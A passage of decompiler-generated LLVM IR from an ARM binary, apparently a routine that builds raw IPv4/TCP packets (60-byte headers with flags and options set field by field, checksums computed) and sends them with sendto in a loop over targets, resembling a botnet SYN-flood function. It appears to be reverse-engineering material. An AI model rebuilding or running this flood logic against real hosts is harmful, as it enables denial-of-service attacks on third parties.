  %v3_c424 = add i32 %v2_c424, 1
  %v4_c424 = inttoptr i32 %v3_c424 to i8*
  store i8 %v5_c148, i8* %v4_c424, align 1
  store i32 %v5_c184, i32* %r2.global-to-local, align 4
  %v2_c430 = load i32, i32* %r4.global-to-local, align 4
  %v3_c430 = add i32 %v2_c430, 4
  %v4_c430 = inttoptr i32 %v3_c430 to i8*
  store i8 %v5_c380, i8* %v4_c430, align 1
  store i32 6, i32* %ip.global-to-local, align 4
  %v0_c43c = load i32, i32* %r0.global-to-local, align 4
  %v2_c43c = icmp eq i32 %v0_c43c, 0
  store i1 %v2_c43c, i1* %cpsr_z.global-to-local, align 1
  %v2_c440 = load i32, i32* %r4.global-to-local, align 4
  %v3_c440 = add i32 %v2_c440, 3
  %v4_c440 = inttoptr i32 %v3_c440 to i8*
  store i8 60, i8* %v4_c440, align 1
  store i32 %v3_c3c4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c44c = load i32, i32* %r2.global-to-local, align 4
  %v1_c44c = trunc i32 %v0_c44c to i8
  %v2_c44c = load i32, i32* %r4.global-to-local, align 4
  %v3_c44c = add i32 %v2_c44c, 8
  %v4_c44c = inttoptr i32 %v3_c44c to i8*
  store i8 %v1_c44c, i8* %v4_c44c, align 1
  %v0_c450 = load i32, i32* %ip.global-to-local, align 4
  %v1_c450 = trunc i32 %v0_c450 to i8
  %v2_c450 = load i32, i32* %r4.global-to-local, align 4
  %v3_c450 = add i32 %v2_c450, 9
  %v4_c450 = inttoptr i32 %v3_c450 to i8*
  store i8 %v1_c450, i8* %v4_c450, align 1
  %v0_c454 = load i32, i32* %r3.global-to-local, align 4
  %v1_c454 = trunc i32 %v0_c454 to i8
  %v2_c454 = load i32, i32* %r4.global-to-local, align 4
  %v3_c454 = add i32 %v2_c454, 2
  %v4_c454 = inttoptr i32 %v3_c454 to i8*
  store i8 %v1_c454, i8* %v4_c454, align 1
  %v3_c458 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c458, i32* %r2.global-to-local, align 4
  %v0_c45c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c45c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_c3e4
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_c460 = load i32, i32* %r4.global-to-local, align 4
  %v4_c460 = add i32 %v3_c460, 6
  %v5_c460 = inttoptr i32 %v4_c460 to i8*
  store i8 64, i8* %v5_c460, align 1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c3e4, %bb
  %v0_c464 = load i32, i32* %r0.global-to-local, align 4
  %v1_c464 = trunc i32 %v0_c464 to i8
  %v2_c464 = load i32, i32* %r4.global-to-local, align 4
  %v3_c464 = add i32 %v2_c464, 5
  %v4_c464 = inttoptr i32 %v3_c464 to i8*
  store i8 %v1_c464, i8* %v4_c464, align 1
  %v0_c468 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c468, label %.thread9, label %bb76

.thread9:                                         ; preds = %.thread
  store i32 %v6_c2a4, i32* %r0.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %.thread
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v6_c2a4, i32* %r0.global-to-local, align 4
  %v3_c470 = load i32, i32* %r4.global-to-local, align 4
  %v4_c470 = add i32 %v3_c470, 7
  %v5_c470 = inttoptr i32 %v4_c470 to i8*
  store i8 0, i8* %v5_c470, align 1
  %v0_c478.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb77

bb77:                                             ; preds = %.thread9, %bb76
  %v0_c478 = phi i32 [ %v6_c2a4, %.thread9 ], [ %v0_c478.pre, %bb76 ]
  %v0_c474 = load i32, i32* %r2.global-to-local, align 4
  %v3_c474 = mul i32 %v0_c474, 32
  store i32 %v3_c474, i32* %r3.global-to-local, align 4
  %v1_c478 = load i32, i32* %r4.global-to-local, align 4
  %v2_c478 = add i32 %v1_c478, 12
  %v3_c478 = inttoptr i32 %v2_c478 to i32*
  store i32 %v0_c478, i32* %v3_c478, align 4
  %v0_c47c = load i32, i32* %r3.global-to-local, align 4
  %v1_c47c = load i32, i32* %r2.global-to-local, align 4
  %tmp83 = mul i32 %v1_c47c, -8
  %v5_c47c = add i32 %v0_c47c, %tmp83
  %v1_c480 = load i32, i32* @r8, align 4
  %v2_c480 = add i32 %v1_c480, %v5_c47c
  store i32 %v2_c480, i32* %r3.global-to-local, align 4
  %v1_c484 = add i32 %v2_c480, 16
  %v2_c484 = inttoptr i32 %v1_c484 to i32*
  %v3_c484 = load i32, i32* %v2_c484, align 4
  store i32 %v3_c484, i32* %r2.global-to-local, align 4
  %v0_c488 = load i32, i32* %r7.global-to-local, align 4
  %v1_c488 = trunc i32 %v0_c488 to i8
  %v2_c488 = load i32, i32* %r4.global-to-local, align 4
  %v3_c488 = add i32 %v2_c488, 20
  %v4_c488 = inttoptr i32 %v3_c488 to i8*
  store i8 %v1_c488, i8* %v4_c488, align 1
  %v0_c48c = load i32, i32* %r2.global-to-local, align 4
  %v1_c48c = load i32, i32* %r4.global-to-local, align 4
  %v2_c48c = add i32 %v1_c48c, 16
  %v3_c48c = inttoptr i32 %v2_c48c to i32*
  store i32 %v0_c48c, i32* %v3_c48c, align 4
  %v0_c490 = load i32, i32* %r4.global-to-local, align 4
  %v1_c490 = add i32 %v0_c490, 20
  store i32 %v1_c490, i32* %r1.global-to-local, align 4
  %v1_c494 = add i32 %v0_c490, 33
  %v2_c494 = inttoptr i32 %v1_c494 to i8*
  %v3_c494 = load i8, i8* %v2_c494, align 1
  %v4_c494 = zext i8 %v3_c494 to i32
  store i32 %v1_c378, i32* %r2.global-to-local, align 4
  %v1_c49c = and i32 %v4_c494, 223
  %v5_c4a0 = or i32 %v1_c49c, %v4_c4a0
  store i32 %v5_c4a0, i32* %r3.global-to-local, align 4
  %v1_c4a4 = trunc i32 %v5_c4a0 to i8
  store i8 %v1_c4a4, i8* %v2_c494, align 1
  %v0_c4a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_c4a8 = add i32 %v0_c4a8, 13
  %v2_c4a8 = inttoptr i32 %v1_c4a8 to i8*
  %v3_c4a8 = load i8, i8* %v2_c4a8, align 1
  %v4_c4a8 = zext i8 %v3_c4a8 to i32
  store i32 %v1_c388, i32* %r3.global-to-local, align 4
  %v1_c4b0 = and i32 %v4_c4a8, 239
  %v5_c4b4 = or i32 %v1_c4b0, %v4_c4b4
  store i32 %v5_c4b4, i32* %r2.global-to-local, align 4
  %v1_c4b8 = trunc i32 %v5_c4b4 to i8
  store i8 %v1_c4b8, i8* %v2_c4a8, align 1
  %v0_c4bc = load i32, i32* %r1.global-to-local, align 4
  %v1_c4bc = add i32 %v0_c4bc, 13
  %v2_c4bc = inttoptr i32 %v1_c4bc to i8*
  %v3_c4bc = load i8, i8* %v2_c4bc, align 1
  %v4_c4bc = zext i8 %v3_c4bc to i32
  store i32 %v1_c38c, i32* %ip.global-to-local, align 4
  %v1_c4c4 = and i32 %v4_c4bc, 247
  %v5_c4c8 = or i32 %v1_c4c4, %v4_c4c8
  store i32 %v5_c4c8, i32* %r3.global-to-local, align 4
  %v1_c4cc = trunc i32 %v5_c4c8 to i8
  store i8 %v1_c4cc, i8* %v2_c4bc, align 1
  %v0_c4d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_c4d0 = add i32 %v0_c4d0, 13
  %v2_c4d0 = inttoptr i32 %v1_c4d0 to i8*
  %v3_c4d0 = load i8, i8* %v2_c4d0, align 1
  %v4_c4d0 = zext i8 %v3_c4d0 to i32
  store i32 %v1_c3b0, i32* %r0.global-to-local, align 4
  %v1_c4d8 = and i32 %v4_c4d0, 251
  %v5_c4dc = or i32 %v1_c4d8, %v4_c4dc
  store i32 %v5_c4dc, i32* %r2.global-to-local, align 4
  %v1_c4e0 = trunc i32 %v5_c4dc to i8
  store i8 %v1_c4e0, i8* %v2_c4d0, align 1
  %v0_c4e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_c4e4 = add i32 %v0_c4e4, 13
  %v2_c4e4 = inttoptr i32 %v1_c4e4 to i8*
  %v3_c4e4 = load i8, i8* %v2_c4e4, align 1
  %v4_c4e4 = zext i8 %v3_c4e4 to i32
  store i32 %v1_c3b4, i32* %r2.global-to-local, align 4
  %v1_c4ec = and i32 %v4_c4e4, 253
  %v4_c4f0 = or i32 %v1_c4ec, %v3_c4f0
  store i32 %v4_c4f0, i32* %r3.global-to-local, align 4
  %v1_c4f4 = trunc i32 %v4_c4f0 to i8
  store i8 %v1_c4f4, i8* %v2_c4e4, align 1
  %v0_c4f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_c4f8 = add i32 %v0_c4f8, 12
  %v2_c4f8 = inttoptr i32 %v1_c4f8 to i8*
  %v3_c4f8 = load i8, i8* %v2_c4f8, align 1
  %v4_c4f8 = zext i8 %v3_c4f8 to i32
  store i32 %v4_c4f8, i32* %r2.global-to-local, align 4
  %v1_c4fc = add i32 %v0_c4f8, 13
  %v2_c4fc = inttoptr i32 %v1_c4fc to i8*
  %v3_c4fc = load i8, i8* %v2_c4fc, align 1
  %v4_c4fc = zext i8 %v3_c4fc to i32
  %tmp84 = urem i8 %v3_c4f8, 16
  %v1_c504 = zext i8 %tmp84 to i32
  %v1_c508 = and i32 %v4_c4fc, 254
  %v2_c50c = or i32 %v1_c508, %v1_c3c0
  %v1_c510 = or i32 %v1_c504, 160
  store i32 %v1_c510, i32* %r2.global-to-local, align 4
  %v1_c514 = trunc i32 %v2_c50c to i8
  store i8 %v1_c514, i8* %v2_c4fc, align 1
  %v0_c518 = load i32, i32* %r2.global-to-local, align 4
  %v1_c518 = trunc i32 %v0_c518 to i8
  %v2_c518 = load i32, i32* %r1.global-to-local, align 4
  %v3_c518 = add i32 %v2_c518, 12
  %v4_c518 = inttoptr i32 %v3_c518 to i8*
  store i8 %v1_c518, i8* %v4_c518, align 1
  store i32 %v3_c520, i32* %r0.global-to-local, align 4
  store i32 %v7_c520, i32* %r2.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_c52c = load i32, i32* %r1.global-to-local, align 4
  %v3_c52c = add i32 %v2_c52c, 3
  %v4_c52c = inttoptr i32 %v3_c52c to i8*
  store i8 %v5_c3dc, i8* %v4_c52c, align 1
  %v0_c530 = load i32, i32* %r0.global-to-local, align 4
  %v1_c530 = trunc i32 %v0_c530 to i8
  %v2_c530 = load i32, i32* %r1.global-to-local, align 4
  %v3_c530 = add i32 %v2_c530, 1
  %v4_c530 = inttoptr i32 %v3_c530 to i8*
  store i8 %v1_c530, i8* %v4_c530, align 1
  %v0_c534 = load i32, i32* %r6.global-to-local, align 4
  %v1_c534 = trunc i32 %v0_c534 to i8
  %v2_c534 = load i32, i32* %r1.global-to-local, align 4
  %v3_c534 = add i32 %v2_c534, 2
  %v4_c534 = inttoptr i32 %v3_c534 to i8*
  store i8 %v1_c534, i8* %v4_c534, align 1
  %v0_c538 = load i32, i32* %r5.global-to-local, align 4
  %v1_c538 = load i32, i32* %r1.global-to-local, align 4
  %v2_c538 = add i32 %v1_c538, 4
  %v3_c538 = inttoptr i32 %v2_c538 to i32*
  store i32 %v0_c538, i32* %v3_c538, align 4
  %v0_c53c = load i32, i32* %ip.global-to-local, align 4
  %v1_c53c = trunc i32 %v0_c53c to i8
  %v2_c53c = load i32, i32* %r4.global-to-local, align 4
  %v3_c53c = add i32 %v2_c53c, 41
  %v4_c53c = inttoptr i32 %v3_c53c to i8*
  store i8 %v1_c53c, i8* %v4_c53c, align 1
  %v0_c540 = load i32, i32* %r3.global-to-local, align 4
  %v1_c540 = trunc i32 %v0_c540 to i8
  %v2_c540 = load i32, i32* %r4.global-to-local, align 4
  %v3_c540 = add i32 %v2_c540, 40
  %v4_c540 = inttoptr i32 %v3_c540 to i8*
  store i8 %v1_c540, i8* %v4_c540, align 1
  %v0_c544 = call i32 @function_f6c4()
  %v1_c548 = mul i32 %v0_c544, 256
  %v1_c54c = and i32 %v1_c548, 3840
  %v1_c550 = or i32 %v1_c54c, 28672
  %v3_c558 = add nuw nsw i32 %v1_c550, 2048
  %v3_c5648 = udiv i32 %v3_c558, 256
  store i32 %v3_c5648, i32* %r1.global-to-local, align 4
  %v0_c568 = load i32, i32* %r4.global-to-local, align 4
  %v1_c568 = add i32 %v0_c568, 42
  store i32 %v1_c568, i32* %r2.global-to-local, align 4
  %v4_c56c = inttoptr i32 %v1_c568 to i8*
  store i8 5, i8* %v4_c56c, align 1
  %v0_c570 = load i32, i32* %r1.global-to-local, align 4
  %v1_c570 = trunc i32 %v0_c570 to i8
  %v2_c570 = load i32, i32* %r2.global-to-local, align 4
  %v3_c570 = add i32 %v2_c570, 1
  %v4_c570 = inttoptr i32 %v3_c570 to i8*
  store i8 %v1_c570, i8* %v4_c570, align 1
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_c57c = load i32, i32* %r4.global-to-local, align 4
  %v3_c57c = add i32 %v2_c57c, 47
  %v4_c57c = inttoptr i32 %v3_c57c to i8*
  store i8 10, i8* %v4_c57c, align 1
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_c588 = load i32, i32* %r3.global-to-local, align 4
  %v1_c588 = trunc i32 %v0_c588 to i8
  %v2_c588 = load i32, i32* %r4.global-to-local, align 4
  %v3_c588 = add i32 %v2_c588, 46
  %v4_c588 = inttoptr i32 %v3_c588 to i8*
  store i8 %v1_c588, i8* %v4_c588, align 1
  %v0_c58c = load i32, i32* %r2.global-to-local, align 4
  %v1_c58c = trunc i32 %v0_c58c to i8
  %v2_c58c = load i32, i32* %r4.global-to-local, align 4
  %v3_c58c = add i32 %v2_c58c, 45
  %v4_c58c = inttoptr i32 %v3_c58c to i8*
  store i8 %v1_c58c, i8* %v4_c58c, align 1
  %v0_c590 = load i32, i32* %r0.global-to-local, align 4
  %v1_c590 = trunc i32 %v0_c590 to i8
  %v2_c590 = load i32, i32* %r4.global-to-local, align 4
  %v3_c590 = add i32 %v2_c590, 44
  %v4_c590 = inttoptr i32 %v3_c590 to i8*
  store i8 %v1_c590, i8* %v4_c590, align 1
  %v0_c594 = call i32 @function_f6c4()
  store i32 %v0_c594, i32* %r0.global-to-local, align 4
  %v2_c59c = load i32, i32* %r4.global-to-local, align 4
  %v3_c59c = add i32 %v2_c59c, 56
  %v4_c59c = inttoptr i32 %v3_c59c to i8*
  store i8 1, i8* %v4_c59c, align 1
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_c5ac = load i32, i32* %r4.global-to-local, align 4
  %v2_c5ac = add i32 %v1_c5ac, 48
  %v3_c5ac = inttoptr i32 %v2_c5ac to i32*
  store i32 %v0_c594, i32* %v3_c5ac, align 4
  %v0_c5b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_c5b0 = trunc i32 %v0_c5b0 to i8
  %v2_c5b0 = load i32, i32* %r4.global-to-local, align 4
  %v3_c5b0 = add i32 %v2_c5b0, 58
  %v4_c5b0 = inttoptr i32 %v3_c5b0 to i8*
  store i8 %v1_c5b0, i8* %v4_c5b0, align 1
  %v0_c5b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_c5b4 = trunc i32 %v0_c5b4 to i8
  %v2_c5b4 = load i32, i32* %r4.global-to-local, align 4
  %v3_c5b4 = add i32 %v2_c5b4, 59
  %v4_c5b4 = inttoptr i32 %v3_c5b4 to i8*
  store i8 %v1_c5b4, i8* %v4_c5b4, align 1
  %v0_c5b8 = load i32, i32* %ip.global-to-local, align 4
  %v1_c5b8 = load i32, i32* %r4.global-to-local, align 4
  %v2_c5b8 = add i32 %v1_c5b8, 52
  %v3_c5b8 = inttoptr i32 %v2_c5b8 to i32*
  store i32 %v0_c5b8, i32* %v3_c5b8, align 4
  %v0_c5bc = load i32, i32* %r2.global-to-local, align 4
  %v1_c5bc = trunc i32 %v0_c5bc to i8
  %v2_c5bc = load i32, i32* %r4.global-to-local, align 4
  %v3_c5bc = add i32 %v2_c5bc, 57
  %v4_c5bc = inttoptr i32 %v3_c5bc to i8*
  store i8 %v1_c5bc, i8* %v4_c5bc, align 1
  %v3_c5c0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c5c0, i32* %r3.global-to-local, align 4
  %v1_c5c4 = add i32 %v3_c5c0, 1
  store i32 %v1_c5c4, i32* %r4.global-to-local, align 4
  %v0_c5c8 = load i32, i32* @sl, align 4
  %v9_c5c8 = icmp eq i32 %v0_c5c8, %v1_c5c4
  store i1 %v9_c5c8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c5c4, i32* %stack_var_-40, align 4
  %v8_c5d0 = icmp sgt i32 %v0_c5c8, %v1_c5c4
  br i1 %v8_c5d0, label %dec_label_pc_c3e4, label %dec_label_pc_c5d4

dec_label_pc_c5d4:                                ; preds = %bb77, %dec_label_pc_c2f0
  %v0_c5d4 = phi i32 [ %v0_c320, %dec_label_pc_c2f0 ], [ %v0_c5c8, %bb77 ]
  %v2_c5d4 = icmp eq i32 %v0_c5d4, 0
  store i1 %v2_c5d4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c78c = icmp eq i32 %v3_c2f8, 65535
  %v2_c808 = icmp eq i32 %v1_c31c, 0
  %v2_c610 = icmp eq i32 %v6_c2a4, -1
  br label %dec_label_pc_c5dc.outer

dec_label_pc_c5dc.outer:                          ; preds = %dec_label_pc_c708, %dec_label_pc_c5d4
  %v1_c5dc.ph.in = phi i32 [ %v1_c6fc, %dec_label_pc_c708 ], [ %v0_c5d4, %dec_label_pc_c5d4 ]
  %v0_c5dc.ph = phi i1 [ %v2_c708, %dec_label_pc_c708 ], [ %v2_c5d4, %dec_label_pc_c5d4 ]
  %v1_c5dc.ph = icmp slt i32 %v1_c5dc.ph.in, 0
  %v4_c5dc = or i1 %v1_c5dc.ph, %v0_c5dc.ph
  br label %dec_label_pc_c5dc

dec_label_pc_c5dc:                                ; preds = %dec_label_pc_c5dc.outer, %dec_label_pc_c5dc
  br i1 %v4_c5dc, label %dec_label_pc_c5dc, label %dec_label_pc_c5e0

dec_label_pc_c5e0:                                ; preds = %dec_label_pc_c5dc
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_c5ec

dec_label_pc_c5ec:                                ; preds = %dec_label_pc_c668, %dec_label_pc_c5e0
  %v1_c5fc = phi i32 [ %v1_c6f8, %dec_label_pc_c668 ], [ 0, %dec_label_pc_c5e0 ]
  %v5_c5f0 = mul i32 %v1_c5fc, 24
  %v1_c5f4 = load i32, i32* @r8, align 4
  %v2_c5f4 = add i32 %v1_c5f4, %v5_c5f0
  store i32 %v2_c5f4, i32* %r3.global-to-local, align 4
  %v1_c5f8 = add i32 %v2_c5f4, 20
  %v2_c5f8 = inttoptr i32 %v1_c5f8 to i8*
  %v3_c5f8 = load i8, i8* %v2_c5f8, align 1
  %v4_c5f8 = zext i8 %v3_c5f8 to i32
  store i32 %v4_c5f8, i32* %r2.global-to-local, align 4
  %v0_c5fc = load i32, i32* %fp.global-to-local, align 4
  %v4_c5fc = mul i32 %v1_c5fc, 4
  %v5_c5fc = add i32 %v0_c5fc, %v4_c5fc
  %v6_c5fc = inttoptr i32 %v5_c5fc to i32*
  %v7_c5fc = load i32, i32* %v6_c5fc, align 4
  store i32 %v7_c5fc, i32* @r5, align 4
  %v7_c600 = icmp eq i8 %v3_c5f8, 31
  store i1 %v7_c600, i1* %cpsr_z.global-to-local, align 1
  %v1_c604 = add i32 %v7_c5fc, 20
  store i32 %v1_c604, i32* @r6, align 4
  %tmp85 = icmp ult i8 %v3_c5f8, 32
  br i1 %tmp85, label %dec_label_pc_c714, label %dec_label_pc_c60c

dec_label_pc_c60c:                                ; preds = %dec_label_pc_c5ec
  store i32 %v6_c2a4, i32* %r0.global-to-local, align 4
  store i1 %v2_c610, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c610, label %dec_label_pc_c77c, label %dec_label_pc_c618

dec_label_pc_c618:                                ; preds = %dec_label_pc_c714, %dec_label_pc_c60c
  store i32 %v3_c2f8, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c78c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c78c, label %dec_label_pc_c798, label %dec_label_pc_c62c

dec_label_pc_c62c:                                ; preds = %dec_label_pc_c77c.dec_label_pc_c62c_crit_edge, %dec_label_pc_c618
  %v1_c630 = phi i32 [ %v1_c630.pre, %dec_label_pc_c77c.dec_label_pc_c62c_crit_edge ], [ 65535, %dec_label_pc_c618 ]
  store i32 %v3_c314, i32* %r3.global-to-local, align 4
  %v9_c630 = icmp eq i32 %v3_c314, %v1_c630
  store i1 %v9_c630, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c630, label %dec_label_pc_c7b4, label %dec_label_pc_c638

dec_label_pc_c638:                                ; preds = %dec_label_pc_c798.dec_label_pc_c638_crit_edge, %dec_label_pc_c62c
  %v1_c63c = phi i32 [ %v1_c63c.pre, %dec_label_pc_c798.dec_label_pc_c638_crit_edge ], [ %v1_c630, %dec_label_pc_c62c ]
  store i32 %v3_c318, i32* %ip.global-to-local, align 4
  %v9_c63c = icmp eq i32 %v3_c318, %v1_c63c
  store i1 %v9_c63c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c63c, label %dec_label_pc_c7d0, label %dec_label_pc_c644

dec_label_pc_c644:                                ; preds = %dec_label_pc_c7b4.dec_label_pc_c644_crit_edge, %dec_label_pc_c638
  %v1_c648 = phi i32 [ %v1_c648.pre, %dec_label_pc_c7b4.dec_label_pc_c644_crit_edge ], [ %v1_c63c, %dec_label_pc_c638 ]
  store i32 %v6_c1e0, i32* %r0.global-to-local, align 4
  %v9_c648 = icmp eq i32 %v6_c1e0, %v1_c648
  store i1 %v9_c648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c648, label %dec_label_pc_c7ec, label %dec_label_pc_c650

dec_label_pc_c650:                                ; preds = %dec_label_pc_c7d0.dec_label_pc_c650_crit_edge, %dec_label_pc_c644
  %v1_c654 = phi i32 [ %v1_c654.pre, %dec_label_pc_c7d0.dec_label_pc_c650_crit_edge ], [ %v1_c648, %dec_label_pc_c644 ]
  store i32 %v6_c1f8, i32* %r2.global-to-local, align 4
  %v9_c654 = icmp eq i32 %v6_c1f8, %v1_c654
  store i1 %v9_c654, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c654, label %dec_label_pc_c800, label %dec_label_pc_c65c

dec_label_pc_c65c:                                ; preds = %dec_label_pc_c7ec, %dec_label_pc_c650
  store i32 %v1_c31c, i32* %r3.global-to-local, align 4
  store i1 %v2_c808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c808, label %dec_label_pc_c668, label %dec_label_pc_c814

dec_label_pc_c668:                                ; preds = %dec_label_pc_c65c, %dec_label_pc_c800, %dec_label_pc_c814
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c66c = load i32, i32* %r7.global-to-local, align 4
  %v1_c66c = trunc i32 %v0_c66c to i8
  %v2_c66c = load i32, i32* @r5, align 4
  %v3_c66c = add i32 %v2_c66c, 10
  %v4_c66c = inttoptr i32 %v3_c66c to i8*
  store i8 %v1_c66c, i8* %v4_c66c, align 1
  %v0_c670 = load i32, i32* %r7.global-to-local, align 4
  %v1_c670 = trunc i32 %v0_c670 to i8
  %v2_c670 = load i32, i32* @r5, align 4
  %v3_c670 = add i32 %v2_c670, 11
  %v4_c670 = inttoptr i32 %v3_c670 to i8*
  store i8 %v1_c670, i8* %v4_c670, align 1
  %v0_c674 = load i32, i32* @r5, align 4
  store i32 %v0_c674, i32* @r0, align 4
  %v2_c678 = call i32 @function_de24(i32 %v0_c674, i32 20)
  %v3_c678 = trunc i32 %v2_c678 to i8
  %v4_c67c28 = udiv i32 %v2_c678, 256
  %v1_c680 = trunc i32 %v4_c67c28 to i8
  %v2_c680 = load i32, i32* @r5, align 4
  %v3_c680 = add i32 %v2_c680, 11
  %v4_c680 = inttoptr i32 %v3_c680 to i8*
  store i8 %v1_c680, i8* %v4_c680, align 1
  %v3_c684 = load i32, i32* @r5, align 4
  %v4_c684 = add i32 %v3_c684, 10
  %v5_c684 = inttoptr i32 %v4_c684 to i8*
  store i8 %v3_c678, i8* %v5_c684, align 1
  %v0_c688 = load i32, i32* @r6, align 4
  store i32 %v0_c688, i32* @r1, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  %v0_c694 = load i32, i32* %r7.global-to-local, align 4
  %v1_c694 = trunc i32 %v0_c694 to i8
  %v3_c694 = add i32 %v0_c688, 16
  %v4_c694 = inttoptr i32 %v3_c694 to i8*
  store i8 %v1_c694, i8* %v4_c694, align 1
  %v0_c698 = load i32, i32* %r7.global-to-local, align 4
  %v1_c698 = trunc i32 %v0_c698 to i8
  %v2_c698 = load i32, i32* @r6, align 4
  %v3_c698 = add i32 %v2_c698, 17
  %v4_c698 = inttoptr i32 %v3_c698 to i8*
  store i8 %v1_c698, i8* %v4_c698, align 1
  %v0_c69c = load i32, i32* @r5, align 4
  store i32 %v0_c69c, i32* %r0.global-to-local, align 4
  %v4_c6a0 = call i32 @function_de80(i32 %v0_c69c, i32 %v0_c688, i32 10240, i32 40)
  %v5_c6a0 = trunc i32 %v4_c6a0 to i8
  store i32 %v4_c6a0, i32* %r0.global-to-local, align 4
  %v4_c6a429 = udiv i32 %v4_c6a0, 256
  %v1_c6a8 = trunc i32 %v4_c6a429 to i8
  %v2_c6a8 = load i32, i32* @r6, align 4
  %v3_c6a8 = add i32 %v2_c6a8, 17
  %v4_c6a8 = inttoptr i32 %v3_c6a8 to i8*
  store i8 %v1_c6a8, i8* %v4_c6a8, align 1
  %v3_c6ac = load i32, i32* @r6, align 4
  %v4_c6ac = add i32 %v3_c6ac, 16
  %v5_c6ac = inttoptr i32 %v4_c6ac to i8*
  store i8 %v5_c6a0, i8* %v5_c6ac, align 1
  %v3_c6b0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c6b0, i32* %r3.global-to-local, align 4
  %v0_c6b4 = load i32, i32* @r5, align 4
  %v1_c6b4 = add i32 %v0_c6b4, 20
  %v2_c6b4 = inttoptr i32 %v1_c6b4 to i32*
  %v3_c6b4 = load i32, i32* %v2_c6b4, align 4
  %v3_c6bc = udiv i32 %v3_c6b4, 65536
  store i32 %v3_c6bc, i32* %r2.global-to-local, align 4
  %v5_c6c0 = mul i32 %v3_c6b0, 24
  %v1_c6c4 = load i32, i32* @r8, align 4
  %v2_c6c4 = add i32 %v1_c6c4, %v5_c6c0
  store i32 %v2_c6c4, i32* %ip.global-to-local, align 4
  %v3_c6c827 = udiv i32 %v3_c6b4, 16777216
  %v1_c6cc = trunc i32 %v3_c6c827 to i8
  %v3_c6cc = add i32 %v2_c6c4, 3
  %v4_c6cc = inttoptr i32 %v3_c6cc to i8*
  store i8 %v1_c6cc, i8* %v4_c6cc, align 1
  %v0_c6d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_c6d0 = trunc i32 %v0_c6d0 to i8
  %v2_c6d0 = load i32, i32* %ip.global-to-local, align 4
  %v3_c6d0 = add i32 %v2_c6d0, 2
  %v4_c6d0 = inttoptr i32 %v3_c6d0 to i8*
  store i8 %v1_c6d0, i8* %v4_c6d0, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c6d8 = load i32, i32* @r5, align 4
  store i32 %v0_c6d8, i32* %r1.global-to-local, align 4
  %v0_c6dc = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_c6dc, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_c6e8 = load i32, i32* %ip.global-to-local, align 4
  %v4_c6e8 = inttoptr i32 %v0_c6e8 to %sockaddr*
  %v7_c6f0 = inttoptr i32 %v0_c6d8 to i32*
  %v9_c6f0 = call i32 @sendto(i32 %v0_c6dc, i32* %v7_c6f0, i32 60, i32 16384, %sockaddr* %v4_c6e8, i32 16)
  %v3_c6f4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c6f4, i32* %r3.global-to-local, align 4
  %v1_c6f8 = add i32 %v3_c6f4, 1
  store i32 %v1_c6f8, i32* %r0.global-to-local, align 4
  %v1_c6fc = load i32, i32* @sl, align 4
  %v9_c6fc = icmp eq i32 %v1_c6f8, %v1_c6fc
  store i1 %v9_c6fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c6f8, i32* %stack_var_-40, align 4
  %v5_c704 = icmp slt i32 %v1_c6f8, %v1_c6fc
  br i1 %v5_c704, label %dec_label_pc_c5ec, label %dec_label_pc_c708

dec_label_pc_c708:                                ; preds = %dec_label_pc_c668
  %v2_c708 = icmp eq i32 %v1_c6fc, 0
  store i1 %v2_c708, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c5dc.outer

dec_label_pc_c714:                                ; preds = %dec_label_pc_c5ec
  %v1_c714 = add i32 %v2_c5f4, 16
  %v2_c714 = inttoptr i32 %v1_c714 to i32*
  %v3_c714 = load i32, i32* %v2_c714, align 4
  store i32 %v3_c714, i32* %r4.global-to-local, align 4
  %v0_c718 = call i32 @function_f6c4()
  store i32 %v0_c718, i32* %r0.global-to-local, align 4
  %v3_c71c = load i32, i32* %stack_var_-40, align 4
